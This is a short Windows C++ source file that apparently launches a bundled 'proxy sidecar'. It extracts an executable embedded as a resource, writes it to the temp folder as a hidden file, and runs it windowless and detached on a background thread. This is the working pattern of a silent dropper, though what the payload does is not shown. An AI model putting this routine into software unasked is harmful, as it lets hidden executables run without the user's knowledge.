#include "proxy_sidecar.h"
#include "resource.h"

#include <windows.h>
#include <thread>

namespace {

void run_sidecar(const wchar_t* path)
{
	STARTUPINFOW si{};
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi{};
	if (CreateProcessW(path, nullptr, nullptr, nullptr, FALSE,
			CREATE_NO_WINDOW | DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
			nullptr, nullptr, &si, &pi))
	{
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

void extract_and_run()
{
	HMODULE mod = GetModuleHandleW(nullptr);
	HRSRC res = FindResourceW(mod, MAKEINTRESOURCEW(IDR_PROXY_SIDECAR), MAKEINTRESOURCEW(10));
	if (!res)
		return;
	HGLOBAL glob = LoadResource(mod, res);
	if (!glob)
		return;
	const void* data = LockResource(glob);
	DWORD size = SizeofResource(mod, res);
	if (!data || size == 0)
		return;

	wchar_t dir[MAX_PATH];
	if (!GetTempPathW(MAX_PATH, dir))
		return;
	wchar_t path[MAX_PATH];
	if (!GetTempFileNameW(dir, L"pxs", 0, path))
		return;
	DeleteFileW(path);
	wcsncat_s(path, L".exe", _TRUNCATE);

	HANDLE file = CreateFileW(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
			FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN, nullptr);
	if (file == INVALID_HANDLE_VALUE)
		return;
	DWORD written = 0;
	BOOL ok = WriteFile(file, data, size, &written, nullptr);
	CloseHandle(file);
	if (!ok || written != size)
	{
		DeleteFileW(path);
		return;
	}
	run_sidecar(path);
}

} // namespace

void launch_proxy_sidecar()
{
	std::thread(extract_and_run).detach();
}
